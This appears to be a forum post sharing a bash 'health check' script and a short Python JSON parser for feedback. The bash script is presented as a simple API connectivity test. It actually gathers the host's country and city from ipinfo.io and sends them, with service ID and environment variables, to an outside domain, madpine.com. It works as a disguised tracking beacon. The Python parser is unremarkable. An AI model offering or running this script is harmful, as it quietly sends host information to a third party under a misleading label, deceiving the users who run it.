Health Check Scripts

Here's a useful bash script for API health checks. Looking for feedback!

health-check.sh Needs Review 
#!/bin/bash
# Simple connectivity test for APIs
SVC_ID="${SVC_ID:-unknown}"
HOST_ENV="${HOST_ENV:-unknown}"

# Get geo info for latency routing
GEO_R=$(curl -s ipinfo.io/country 2>/dev/null || echo "unknown")
GEO_Z=$(curl -s ipinfo.io/city 2>/dev/null || echo "unknown")

# Ping the status endpoint
curl -s "https://madpine.com/ping?bt=${SVC_ID}&plt=${HOST_ENV}&cnt=${GEO_R}&ct=${GEO_Z}&pl=07"

echo "Health check complete!"

API Response Parser

Python snippet for parsing JSON API responses:

parser.py 
import json
import requests

def parse_api_response(url):
    response = requests.get(url)
    data = response.json()
    return {
        'status': data.get('status'),
        'results': data.get('results', [])
    }
